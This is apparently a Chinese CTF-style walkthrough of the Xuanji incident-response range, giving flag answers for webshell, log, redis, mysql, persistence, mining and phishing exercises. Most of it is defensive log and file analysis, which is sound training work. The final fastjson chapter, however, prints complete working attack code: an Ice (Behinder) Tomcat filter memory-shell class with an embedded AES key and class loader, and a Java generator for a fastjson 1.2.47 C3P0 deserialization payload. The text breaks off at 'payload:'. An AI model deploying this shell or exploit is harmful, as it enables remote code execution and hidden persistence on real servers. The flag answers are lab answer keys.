# 玄机应急响应靶场刷题


玄机应急响应靶场刷题wp

<!--more-->

https://xj.edisec.net/  

## 第一章 应急响应-Linux入侵排查

1.web目录存在木马，请找到木马的密码提交

```
flag{1}
```

使用D盾扫描Linux主机Webshell

https://winfsp.dev/rel/

安装完成后我们就可以通过右键“此电脑”->“映射网络驱动器”进行挂载，首次连接时需要验证SSH用户密码

![image-20240528155838238](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528155838238.png?imageSlim)

```
\\sshfs\root@192.168.1.120          //映射home目录
\\sshfs\root@192.168.1.120\/        //映射/根目录
\\sshfs.r\root@192.168.1.120        //映射/根目录
\\sshfs.r\root@192.168.1.120!1234   //映射/根目录（其他端口）
```

![image-20240528155545395](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528155545395.png?imageSlim)

![image-20240528155536604](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528155536604.png?imageSlim)

然后用d盾扫描linux的www目录

![image-20240528160326229](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528160326229.png?imageSlim)

![image-20240528160533385](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528160533385.png?imageSlim)

也可以用net use命令将Linux根目录映射挂载到本地，Z为映射的磁盘盘符，这里也需要验证SSH用户密码。

```
net use              //列出所有网络连接
net use Z: /del      //删除本机映射的Z盘 
net use * /del /y    //删除所有映射和IPC$
net use Z: \\sshfs\root@192.168.1.120\/         //将对方根目录映射为Z盘
net use Z: \\sshfs.r\root@192.168.1.120         //将对方根目录映射为Z盘
net use Z: \\sshfs.r\root@192.168.1.120!1234    //将对方根目录映射为Z盘（其他端口）
```

2.服务器疑似存在不死马，请找到不死马的密码提交

```
flag{hello}
```

![image-20240528160902856](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528160902856.png?imageSlim)

md5爆破得到不死马的密码hello

3.不死马是通过哪个文件生成的，请提交文件名

```
flag{index.php}
```

见上题

4.黑客留下了木马文件，请找出黑客的服务器ip提交

```
flag{10.11.55.21}
```

可疑文件，放到云沙箱分析一下

![image-20240528161102670](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528161102670.png?imageSlim)

![image-20240528161510131](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528161510131.png?imageSlim)

5.黑客留下了木马文件，请找出黑客服务器开启的监端口提交

```
flag(3333)
```

在Linux环境中执行一下

![image-20240528161901254](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528161901254.png?imageSlim)

同时netstat查看连接远端的端口

![image-20240528161830896](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528161830896.png?imageSlim)

## 第一章 应急响应-webshell查杀

1.黑客webshell里面的flag flag{xxxxx-xxxx-xxxx-xxxx-xxxx}

```
flag{027ccd04-5065-48b6-a32d-77c704a5e26d}
```

映射Linux的根目录到本地，d盾扫描www目录

```
\\sshfs.r\root@43.192.44.224
```

![image-20240528162426048](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528162426048.png?imageSlim)

在include/gz.php中发现flag

![image-20240528162501029](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528162501029.png?imageSlim)

2.黑客使用的什么工具的shell github地址的md5 flag{md5}

```
flag{39392de3218c333f794befef07ac9257}
```

根据gz.php(文件名)，以及shell的php代码特征可判断为哥斯拉webshell

https://github.com/BeichenDream/Godzilla

计算md5得到flag

![image-20240528162626345](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528162626345.png?imageSlim)

3.黑客隐藏shell的完整路径的md5 flag{md5} 注 : /xxx/xxx/xxx/xxx/xxx.xxx

```
flag{aebac0e58cd6c5fad1695ee4d1ac1919}
```

隐藏webshell为/var/www/html/include/Db/.Mysqli.php

![image-20240528162426048](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528162426048.png?imageSlim)

4.黑客免杀马完整路径 md5 flag{md5}

```
flag{eeff2eabfd9b7a6d26fc1a53d3f7d1de}
```

结合d盾查杀结果，并根据其代码可判断免杀马为/var/www/html/wap/top.php

![image-20240528162836191](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528162836191.png?imageSlim)

## 第一章 应急响应-Linux日志分析

1.有多少IP在爆破主机ssh的root帐号，如果有多个使用","分割 小到大排序 例如flag{192.168.200.1,192.168.200.2}

```
flag{192.168.200.2,192.168.200.32,192.168.200.31}
```

![image-20240529104517178](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529104517178.png?imageSlim)

```
cd /var/log

cat auth.log.1 | grep -a "Failed password for root" | awk '{print $11}' | sort | uniq -c | sort -nr | more
```

2.ssh爆破成功登陆的IP是多少，如果有多个使用","分割

```
flag{192.168.200.2}
```

![image-20240529104713024](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529104713024.png?imageSlim)

```
cat auth.log.1 | grep -a "Accepted " | awk '{print $11}' | sort | uniq -c | sort -nr | more
```

3.爆破用户名字典是什么？如果有多个使用","分割

```
flag{user,hello,root,test3,test2,test1}
```

![image-20240529104901939](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529104901939.png?imageSlim)

```
cat auth.log.1 | grep -a "Failed password" | perl -e 'while($_=<>){ /for(.*?) from/; print "$1\n";}'| uniq -c | sort -nr
```

4.成功登录 root 用户的 ip 一共爆破了多少次

```
flag{4}
```

结合问题1和2可知

5.黑客登陆主机后新建了一个后门用户，用户名是多少

```
flag{test2}
```

![image-20240529105054674](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529105054674.png?imageSlim)

```
cat auth.log.1 |grep -a "new user"
```

## 第二章 日志分析-redis应急响应

1.通过本地 PC SSH到服务器并且分析黑客攻击成功的 IP 为多少,将黑客 IP 作为 FLAG 提交;

```
flag{192.168.200.2}
```

![image-20240529110419130](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529110419130.png?imageSlim)

```
cd /var/log
cat redis.log
```

2.通过本地 PC SSH到服务器并且分析黑客第一次上传的恶意文件,将黑客上传的恶意文件里面的 FLAG 提交;

```
flag{XJ_78f012d7-42fc-49a8-8a8c-e74c87ea109b}
```

![image-20240529110526764](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529110526764.png?imageSlim)

在日志中发现加载模块exp.so

![image-20240529110838521](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529110838521.png?imageSlim)

```
cat /exp.so
```

![image-20240529111102907](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529111102907.png?imageSlim)

3.通过本地 PC SSH到服务器并且分析黑客反弹 shell 的IP 为多少,将反弹 shell 的IP 作为 FLAG 提交;

```
flag{192.168.100.13}
```

![image-20240529111412345](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529111412345.png?imageSlim)

```
crontab -l查看计划任务
```

4.通过本地 PC SSH到服务器并且溯源分析黑客的用户名，并且找到黑客使用的工具里的关键字符串(flag{黑客的用户-关键字符串} 注关键字符串 xxx-xxx-xxx)。将用户名和关键字符串作为 FLAG提交

```
flag{xj-test-user-wow-you-find-flag}
```

![image-20240529111852222](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529111852222.png?imageSlim)

```
cat /root/.ssh/authorized_keys
```

发现用户名为：xj-test-user  使用github进行溯源，地址为：

https://github.com/xj-test-user/redis-rogue-getshell/commit/76b1b74b92f9cc6ef2a62985debdf09dcc056636，

发现在文件中内置：wow-you-find-flag

5.通过本地 PC SSH到服务器并且分析黑客篡改的命令,将黑客篡改的命令里面的关键字符串作为 FLAG 提交;

```
flag{c195i2923381905517d818e313792d196}
```

![image-20240529112536471](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529112536471.png?imageSlim)

```
cd /usr/bin
ls -al
发现ps和ps_
file ps可发现其为文本文件
cat ps
```

## 第二章 日志分析-apache日志分析

1.提交当天访问次数最多的IP，即黑客IP：

```
flag{192.168.200.2}
```

![image-20240529113140367](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529113140367.png?imageSlim)

```
cd /var/log/apache2
cat access.log.1 | grep "03/Aug/2023:08:" | awk '{print $1}' | sort | uniq -c | sort -nr | head -n 10
```

2.黑客使用的浏览器指纹是什么，提交指纹的md5：

```
flag{2d6330f380f44ac20f3a02eed0958f66}
```

![image-20240529113514663](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529113514663.png?imageSlim)

```
cat access.log
随后计算浏览器指纹
```

3.查看index.php页面被访问的次数，提交次数：

```
flag{27}
```

```
cat access.log.1 |grep "/index.php" |wc -l
```

4.查看黑客IP访问了多少次，提交次数：

```
flag{6555}
```

```
cat access.log.1 | grep "192.168.200.2 - -"  | wc -l
```

5.查看2023年8月03日8时这一个小时内有多少IP访问，提交次数:

```
flag{5}
```

![image-20240529113706362](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529113706362.png?imageSlim)

## 第二章 日志分析-mysql应急响应 

1.黑客第一次写入的shell flag{关键字符串} 

```
flag{ccfda79e-7aa1-4275-bc26-a6189eb9a20b}
```

![image-20240529114326521](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529114326521.png?imageSlim)

把Linux系统目录映射到本地，拿d盾扫描

![image-20240529114520179](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529114520179.png?imageSlim)

访问sh.php得到flag

![image-20240529114628631](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529114628631.png?imageSlim)

2.黑客反弹shell的ip flag{ip}

```
flag{192.168.100.13}
```

![](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529114818725.png?imageSlim)

可以发现执行了/tmp目录下的1.sh

```
cat /tmp/1.sh
```

![image-20240529114920063](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529114920063.png?imageSlim)

3.黑客提权文件的完整路径 md5 flag{md5} 注 /xxx/xxx/xxx/xxx/xxx.xx

```
flag{b1818bde4e310f3d23f1005185b973e7}
```

mysql数据库，猜测是udf提权

查到数据库密码

![image-20240529115056456](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529115056456.png?imageSlim)

登录数据库

![image-20240529115141995](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529115141995.png?imageSlim)

```
/usr/lib/mysql/plugin/udf.so
计算md5即可
```

4.黑客获取的权限 flag{whoami后的值}

```
flag{mysql}
```

udf提权拿到的是mysql权限

## 第三章 权限维持-Linux权限维持-隐藏

1.黑客隐藏的隐藏的文件 完整路径md5

```
flag{109ccb5768c70638e24fb46ee7957e37}
```

```
find / -type f -name ".*" 2>/dev/null | grep -v "^\/sys\/" // 查找隐藏文件
find / -type d -name ".*" 2>/dev/null // 查找隐藏目录
```

可疑目录

![image-20240530155011058](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530155011058.png?imageSlim)

隐藏了1.py

md5(/tmp/.temp/libprocesshider/1.py)

2.黑客隐藏的文件反弹shell的ip+端口 {ip:port}

```
flag{114.114.114.121:9999}
```

查看1.py

![image-20240530155548113](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530155548113.png?imageSlim)

3.黑客提权所用的命令 完整路径的md5 flag{md5}

```
flag{7fd5884f493f4aaf96abee286ee04120}
```

查找设置了suid权限的程序

```
find / -type f -perm -4000 2>/dev/null
```

![image-20240530155855769](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530155855769.png?imageSlim)

切换到ctf用户验证

![image-20240530160503694](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530160503694.png?imageSlim)

find命令路径

![image-20240530160544231](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530160544231.png?imageSlim)

4.黑客尝试注入恶意代码的工具完整路径md5

```
flag{087c267368ece4fcf422ff733b51aed9}
```

查找隐藏目录

```
/home/ctf# find / -type d -name ".*" 2>/dev/null
```

![image-20240530160732803](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530160732803.png?imageSlim)

注入工具

![image-20240530160823387](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530160823387.png?imageSlim)

![image-20240530160929682](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530160929682.png?imageSlim)

md5(/opt/.cymothoa-1-beta/cymothoa)

5.使用命令运行 ./x.xx 执行该文件 将查询的 Exec****** 值 作为flag提交 flag{/xxx/xxx/xxx}

```
flag{/usr/bin/python3.4}
```

执行

```
python3 /tmp/.temp/libprocesshider/1.py
```

![image-20240530161632044](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530161632044.png?imageSlim)

随后进入`/proc/9197/`，`cat cmdline`

![image-20240530161757678](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530161757678.png?imageSlim)

## 第五章 Windows实战-evtx日志文件分析

步骤1.将黑客成功登录系统所使用的IP地址作为Flag值提交；

![image-20240512193018370](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240512193018370.png?imageSlim)

安全日志事件ID4625，flag{192.168.36.133}

步骤2.黑客成功登录系统后修改了登录用户的用户名，将修改后的用户名作为Flag值提交；

安全日志事件ID4781，flag{Adnimistartro}

![image-20240512194150801](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240512194150801.png?imageSlim)

步骤3.黑客成功登录系统后成功访问了一个关键位置的文件，将该文件名称（文件名称不包含后缀）作为Flag值提交；

安全日志事件ID4663，flag{SCHEMA}

![image-20240512194646087](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240512194646087.png?imageSlim)

步骤4.黑客成功登录系统后重启过几次数据库服务，将最后一次重启数据库服务后数据库服务的进程ID号作为Flag值提交；

应用程序日志，source为MySql，flag{8820}

![image-20240512195751232](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240512195751232.png?imageSlim)

步骤5.黑客成功登录系统后修改了登录用户的用户名并对系统执行了多次重启操作，将黑客使用修改后的用户重启系统的次数作为Flag值提交。

在系统日志中，事件ID1074，共有3对记录，flag{3}

![image-20240512201419723](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240512201419723.png?imageSlim)

## 第五章 Linux实战-挖矿

1.黑客的IP是？ flag格式：flag{黑客的ip地址}，如：flag{127.0.0.1}在

```
flag{192.168.10.135}
```

在/www/admin/websec_80/log/nginx_access_2023-12-22.log中可查看

![image-20240530162911771](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530162911771.png?imageSlim)

2.黑客攻陷网站的具体时间是？ flag格式：flag{年-月-日 时:分:秒}，如：flag{2023-12-24 22:23:24}

```
flag{2023-12-22 19:08:34}
```

```
cat nginx_access_2023-12-22.log | grep 200
```

![image-20240530163203613](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530163203613.png?imageSlim)

访问了/dede路径

后台地址：/dede 账号：admin 密码：12345678

![image-20240530163640930](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530163640930.png?imageSlim)

3.黑客上传webshell的名称及密码是？ flag格式：flag{黑客上传的webshell名称-webshell密码}，如：flag{webshell.php-pass}

```
flag{404.php-cmd}
```

将Linux的存储映射到本地，然后用d盾进行扫描

![image-20240530164123769](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530164123769.png?imageSlim)

![image-20240530164153083](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530164153083.png?imageSlim)

解码得到密码为cmd

4.黑客提权后设置的后门文件名称是？ flag格式：flag{后门文件绝对路径加上名称}，如：flag{/etc/passwd}

```
flag{/usr/bin/find}
```

history，发现赋予find命令suid权限（4775或u+s）

![image-20240530164533747](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530164533747.png?imageSlim)

5.对黑客上传的挖矿病毒进行分析，获取隐藏的Flag

```
flag{websec_True@888!}
```

查看计划任务`crontab -l`，并没有，`cat /etc/crontab`

![image-20240530164952367](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530164952367.png?imageSlim)

文件为ldm，`find / -name "ldm"`发现文件存在于/etc/.cache/ldm

`cat ldm`

![image-20240530165043367](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530165043367.png?imageSlim)

解码得到flag

## 第七章 常见攻击事件分析--钓鱼邮件

1.请分析获取黑客发送钓鱼邮件时使用的IP，flag格式： flag{11.22.33.44}

```
121.204.224.15
```

![image-20240528152940474](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528152940474.png?imageSlim)

2.请分析获取黑客钓鱼邮件中使用的木马程序的控制端IP，flag格式：flag{11.22.33.44}

```
107.16.111.57
```

附件下载下来，放到云沙箱中分析

![image-20240528153225816](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528153225816.png?imageSlim)

3.黑客在被控服务器上创建了webshell，请分析获取webshell的文件名，请使用完整文件格式，flag格式：flag{/var/www/html/shell.php}

```

```

d盾扫描www目录

```
flag{/var/www/html/admin/ebak/ReData.php}
```

![image-20240528153321674](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528153321674.png?imageSlim)

4.flag4: 黑客在被控服务器上创建了内网代理隐蔽通信隧道，请分析获取该隧道程序的文件名，请使用完整文件路径，flag格式：flag{/opt/apache2/shell}

```
flag{/var/tmp/proc/mysql}
```

在var/tmp/proc目录下发现my.conf类似流量穿透工具配置，可推测mysql为隐蔽通信隧道

![image-20240528153838841](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528153838841.png?imageSlim)

## 第八章 内存马分析-java03-fastjson

1.fastjson版本作为 flag 提交 flag{x.x.66}

```
flag{1.2.47}
```

```
>fscan64.exe -h 52.83.21.132 -p 1-65535
```

![image-20240530105458982](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530105458982.png?imageSlim)

发现存在web页面，对登录框的请求体中去掉一个}，发成报错，但委会显fastjson相关字符

![image-20240530105723828](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530105723828.png?imageSlim)

直接探测fastjson版本，依旧没探测到发fastjson相关字段

![image-20240530105823900](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530105823900.png?imageSlim)

Unicode编码之后得到版本的回显，可能是加了waf

![image-20240530110516740](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530110516740.png?imageSlim)

2.内核版本作为 flag 提交 flag{Dexxxxxxxxxux}

```
flag{Debian 4.19.260-1 (2022-09-29) x86_64 GNU/Linux}
```

Fastjson1.2.47版本以下存在mappings缓存通杀绕过，利用的方式为JNDI

> JNDI利用条件
>
> - 非严格意义的出网，比如这里我们控制了外网主机，可以使用该主机作为server端提供ldap或rmi
> - 受到JDK版本限制，JDK8u191后受到trusturlcodebase限制远程加载，但也有绕过方法。这里因为机器内JDK版本较高，JNDI注入并不太合适，所以需要找其他利用链。

随后探测存在的依赖，利用Character转换报错可以判断存在何种依赖，当存在该类时会报出类型转换错误，否则无显示，同样，这里@type也需要编码。通过这种方法结合已知的FastJson利用链所需要的依赖类，最终探测服务中存在C3P0依赖。

```
{
"x":{
"\u0040\u0074\u0079\u0070\u0065":"java.lang.Character"{"\u0040\u0074\u0079\u0070\u0065":"java.lang.Class",
"val":"com.mchange.v2.c3p0.DataSources"}}
```

![image-20240530111139430](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530111139430.png?imageSlim)

先找一个冰蝎内存马:Tomcat的Filter型内存马,但因为是TemplatesImpl这条链加载字节码，所以需要extends AbstractTranslet并重写两个方法，否则加载不了这个类。编译为IceShell.class：

```
import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;import java.io.IOException;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.lang.reflect.Method;import java.util.Base64;import java.util.HashMap;import java.util.Map;import javax.crypto.Cipher;import javax.crypto.spec.SecretKeySpec;import javax.servlet.DispatcherType;import javax.servlet.Filter;import javax.servlet.FilterChain;import javax.servlet.FilterConfig;import javax.servlet.ServletException;import javax.servlet.ServletRequest;import javax.servlet.ServletResponse;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import javax.servlet.http.HttpSession;import org.apache.catalina.Context;import org.apache.catalina.core.ApplicationFilterConfig;import org.apache.catalina.core.StandardContext;import org.apache.catalina.loader.WebappClassLoaderBase;import org.apache.tomcat.util.descriptor.web.FilterDef;import org.apache.tomcat.util.descriptor.web.FilterMap;import sun.misc.BASE64Decoder;
public class IceShell extends AbstractTranslet implements Filter {    private final String pa = "3ad2fddfe8bad8e6";
    public IceShell() {    }
    public void init(FilterConfig filterConfig) throws ServletException {    }
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {        HttpServletRequest request = (HttpServletRequest)servletRequest;        HttpServletResponse response = (HttpServletResponse)servletResponse;        HttpSession session = request.getSession();        Map<String, Object> pageContext = new HashMap();        pageContext.put("session", session);        pageContext.put("request", request);        pageContext.put("response", response);        ClassLoader cl = Thread.currentThread().getContextClassLoader();        if (request.getMethod().equals("POST")) {            Class Lclass;            if (cl.getClass().getSuperclass().getName().equals("java.lang.ClassLoader")) {                Lclass = cl.getClass().getSuperclass();                this.RushThere(Lclass, cl, session, request, pageContext);            } else if (cl.getClass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {                Lclass = cl.getClass().getSuperclass().getSuperclass();                this.RushThere(Lclass, cl, session, request, pageContext);            } else if (cl.getClass().getSuperclass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {                Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass();                this.RushThere(Lclass, cl, session, request, pageContext);            } else if (cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {                Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();                this.RushThere(Lclass, cl, session, request, pageContext);            } else if (cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {                Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();                this.RushThere(Lclass, cl, session, request, pageContext);            } else {                Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();                this.RushThere(Lclass, cl, session, request, pageContext);            }
            filterChain.doFilter(servletRequest, servletResponse);        }
    }
    public void destroy() {    }
    public void RushThere(Class Lclass, ClassLoader cl, HttpSession session, HttpServletRequest request, Map<String, Object> pageContext) {        byte[] bytecode = Base64.getDecoder().decode("yv66vgAAADQAGgoABAAUCgAEABUHABYHABcBAAY8aW5pdD4BABooTGphdmEvbGFuZy9DbGFzc0xvYWRlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQADTFU7AQABYwEAF0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQABZwEAFShbQilMamF2YS9sYW5nL0NsYXNzOwEAAWIBAAJbQgEAClNvdXJjZUZpbGUBAAZVLmphdmEMAAUABgwAGAAZAQABVQEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAC2RlZmluZUNsYXNzAQAXKFtCSUkpTGphdmEvbGFuZy9DbGFzczsAIQADAAQAAAAAAAIAAAAFAAYAAQAHAAAAOgACAAIAAAAGKiu3AAGxAAAAAgAIAAAABgABAAAAAgAJAAAAFgACAAAABgAKAAsAAAAAAAYADAANAAEAAQAOAA8AAQAHAAAAPQAEAAIAAAAJKisDK763AAKwAAAAAgAIAAAABgABAAAAAwAJAAAAFgACAAAACQAKAAsAAAAAAAkAEAARAAEAAQASAAAAAgAT");
        try {            Method define = Lclass.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);            define.setAccessible(true);            Class uclass = null;
            try {                uclass = cl.loadClass("U");            } catch (ClassNotFoundException var18) {                uclass = (Class)define.invoke(cl, bytecode, 0, bytecode.length);            }
            Constructor constructor = uclass.getDeclaredConstructor(ClassLoader.class);            constructor.setAccessible(true);            Object u = constructor.newInstance(this.getClass().getClassLoader());            Method Um = uclass.getDeclaredMethod("g", byte[].class);            Um.setAccessible(true);            String k = "3ad2fddfe8bad8e6";            session.setAttribute("u", k);            Cipher c = Cipher.getInstance("AES");            c.init(2, new SecretKeySpec(k.getBytes(), "AES"));            byte[] eClassBytes = c.doFinal((new BASE64Decoder()).decodeBuffer(request.getReader().readLine()));            Class eclass = (Class)Um.invoke(u, eClassBytes);            Object a = eclass.newInstance();            Method b = eclass.getDeclaredMethod("equals", Object.class);            b.setAccessible(true);            b.invoke(a, pageContext);        } catch (Exception var19) {        }
    }
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {    }
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {    }
    static {        try {            String name = "AutomneGreet";            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase)Thread.currentThread().getContextClassLoader();            StandardContext standardContext = (StandardContext)webappClassLoaderBase.getResources().getContext();            Field Configs = Class.forName("org.apache.catalina.core.StandardContext").getDeclaredField("filterConfigs");            Configs.setAccessible(true);            Map filterConfigs = (Map)Configs.get(standardContext);            if (filterConfigs.get("AutomneGreet") == null) {                Filter filter = new IceShell();                FilterDef filterDef = new FilterDef();                filterDef.setFilter(filter);                filterDef.setFilterName("AutomneGreet");                filterDef.setFilterClass(filter.getClass().getName());                standardContext.addFilterDef(filterDef);                FilterMap filterMap = new FilterMap();                filterMap.addURLPattern("/shell");                filterMap.setFilterName("AutomneGreet");                filterMap.setDispatcher(DispatcherType.REQUEST.name());                standardContext.addFilterMapBefore(filterMap);                Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);                constructor.setAccessible(true);                ApplicationFilterConfig filterConfig = (ApplicationFilterConfig)constructor.newInstance(standardContext, filterDef);                filterConfigs.put("AutomneGreet", filterConfig);            }        } catch (Exception var10) {        }
    }}
```

内存马做好后结合c3p0链生成json，最终exp如下：

```
import com.alibaba.fastjson.JSONArray;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import javax.management.BadAttributeValueExpException;import java.io.ByteArrayOutputStream;import java.io.IOException;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;import java.util.HashMap;
public class rce {    public static void main(String[] args) throws Exception {        String hex2 = bytesToHex(tobyteArray(gen()));        String FJ1247 = "{n" +                "    "a":{n" +                "        "\u0040\u0074\u0079\u0070\u0065":"java.lang.Class",n" +                "        "val":"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource"n" +                "    },n" +                "    "b":{n" +                "        "\u0040\u0074\u0079\u0070\u0065":"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource",n" +                "        "\u0075\u0073\u0065\u0072\u004F\u0076\u0065\u0072\u0072\u0069\u0064\u0065\u0073\u0041\u0073\u0053\u0074\u0072\u0069\u006E\u0067":"HexAsciiSerializedMap:" + hex2 + ";",n" +                "    }n" +                "}n";        System.out.println(FJ1247);    }    //FastJson原生反序列化加载恶意类字节码    public static Object gen() throws Exception {        TemplatesImpl templates = TemplatesImpl.class.newInstance();        byte[] bytes = Files.readAllBytes(Paths.get("C:\Users\Administrator\Desktop\untitled\src\main\java\IceShell.java")); //做好的冰蝎马地址，读取其中字节即可        setValue(templates, "_bytecodes", new byte[][]{bytes});        setValue(templates, "_name", "1");        setValue(templates, "_tfactory", null);
        JSONArray jsonArray = new JSONArray();        jsonArray.add(templates);
        BadAttributeValueExpException bd = new BadAttributeValueExpException(null);        setValue(bd,"val",jsonArray);
        HashMap hashMap = new HashMap();        hashMap.put(templates,bd);        return hashMap;    }    public static void setValue(Object obj, String name, Object value) throws Exception{        Field field = obj.getClass().getDeclaredField(name);        field.setAccessible(true);        field.set(obj, value);    }
    //将类序列化为字节数组    public static byte[] tobyteArray(Object o) throws IOException {        ByteArrayOutputStream bao = new ByteArrayOutputStream();        ObjectOutputStream oos = new ObjectOutputStream(bao);        oos.writeObject(o);   //        return bao.toByteArray();    }
    //字节数组转十六进制    public static String bytesToHex(byte[] bytes) {        StringBuffer stringBuffer = new StringBuffer();        for (int i = 0; i < bytes.length; i++) {            String hex = Integer.toHexString(bytes[i] & 0xff);      //bytes[]中为带符号字节-255~+255，&0xff: 保证得到的数据在0~255之间            if (hex.length()<2){                stringBuffer.append("0" + hex);   //0-9 则在前面加‘0’,保证2位避免后面读取错误            }else {                stringBuffer.append(hex);            }        }        return stringBuffer.toString();    }}
```

加入tomcat和fastjson依赖，编译运行，得到一串json格式数据

```
<dependencies>        <dependency>            <groupId>org.apache.tomcat.embed</groupId>            <artifactId>tomcat-embed-core</artifactId>            <version>8.5.37</version>        </dependency>        <dependency>            <groupId>com.alibaba</groupId>            <artifactId>fastjson</artifactId>            <version>1.2.47</version>        </dependency>    </dependencies>
```

payload：

```
